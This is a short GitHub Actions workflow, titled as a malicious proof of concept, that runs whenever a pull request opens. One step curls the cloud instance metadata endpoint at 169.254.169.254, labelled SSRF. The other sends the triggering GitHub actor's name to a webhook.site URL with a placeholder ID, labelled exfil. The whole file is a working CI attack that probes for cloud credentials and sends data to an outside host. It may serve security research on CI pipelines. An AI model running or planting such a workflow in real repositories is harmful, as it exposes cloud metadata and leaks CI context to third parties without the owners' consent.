name: Malicious Workflow POC
on: [pull_request]
jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
    - name: SSRF Metadata
      run: curl "http://169.254.169.254/latest/meta-data/"
    - name: Exfil Context  
      run: curl "https://webhook.site/YOUR-ID?actor=${{ github.actor }}"
